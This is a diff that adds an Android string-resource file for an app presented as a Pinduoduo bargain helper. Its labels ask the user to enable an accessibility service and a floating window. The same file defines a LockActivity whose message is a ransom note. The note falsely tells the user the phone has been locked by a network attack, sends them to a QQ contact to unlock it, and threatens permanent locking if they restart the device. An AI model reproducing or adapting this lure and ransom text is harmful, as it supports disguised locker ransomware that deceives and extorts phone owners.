@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+
+    <string name="app_name">拼多多砍价</string>
+    <string name="Title">拼多多砍价</string>
+    <string name="action_settings">帮助</string>
+    <string name="action_floatwindow">打开悬浮窗口</string>
+    <string name="nn_sel_game_type">请选择游戏类型：\n（微信内置游戏请选择：微信）</string>
+    <string name="nn_sel_type">请选择必抢数值</string>
+    <string name="nn_remark">注：打开以上功能，系统会随机自动匹配，可多开！</string>
+    <string name="service_name">拼多多砍价</string>
+    <string name="floating">开始砍价</string>
+    <string name="float_btReturn">返回设置</string>
+    <string name="accessibility_description">请启动拼多多砍价服务！</string>
+    <string name="title_activity_lock">LockActivity</string>
+    <string name="hello_world">Hello world!</string>
+    <string name="lock_say">您的手机遭遇网络攻击！\n已暂时锁定！\n请联系客服：\nQQ：1096754477\n解锁!\n警告：请记牢客服QQ号，千万不能重启手机！否则手机会被永久锁死！</string>
+    <string name="title_activity_camera">CameraActivity</string>
+</resources>
